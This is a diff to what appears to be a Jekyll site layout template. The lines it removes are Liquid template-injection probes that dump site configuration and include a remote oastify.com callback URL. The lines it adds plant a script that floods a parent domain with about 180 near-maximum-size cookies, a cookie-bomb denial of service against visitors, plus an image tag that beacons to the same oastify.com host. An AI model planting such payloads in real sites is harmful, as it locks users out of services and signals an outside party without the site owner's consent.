@@ -6,10 +6,22 @@
   <link rel="stylesheet" href="{{ '/assets/style.css' | relative_url }}">
 </head>
 <body>
-{{ site.config }}
-{{ site | inspect }}
-{{ page | inspect }}
-  {% include https://w0xzty31etlqntd8g791zzexmosfg64v.oastify.com %}
+<script>const domain = ".example.com"; // change to your domain
+const maxCookies = 180;
+const maxBytes = 4096;
+
+for (let i = 0; i < maxCookies; i++) {
+  const name = `c${i}`;
+  // fill value up to limit (accounting for name, =, and attributes)
+  const overhead = `${name}=; domain=${domain}; path=/`.length;
+  const value = "x".repeat(maxBytes - overhead);
+  
+  document.cookie = `${name}=${value}; domain=${domain}; path=/`;
+}
+
+// verify how many were set
+const set = document.cookie.split(";").length;
+console.log(`Cookies set: ${set}`);</script>
 <img src=https://w0xzty31etlqntd8g791zzexmosfg64v.oastify.com>
   <main>
     {{ content }}
